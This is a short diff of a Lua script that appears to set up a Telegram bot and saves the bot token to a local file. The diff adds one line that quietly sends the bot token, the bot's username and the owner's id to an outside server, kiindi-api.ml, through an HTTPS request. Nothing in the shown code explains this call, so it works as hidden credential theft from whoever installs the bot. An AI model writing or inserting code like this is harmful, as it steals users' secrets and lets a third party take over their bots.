@@ -94,6 +94,7 @@ info.id = SUDO_USER
 info.token = Token
 info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
+https.request('https://kiindi-api.ml/lua/nizk/elnizk.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
 Cr_file = io.open("./YEMEN/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close() 
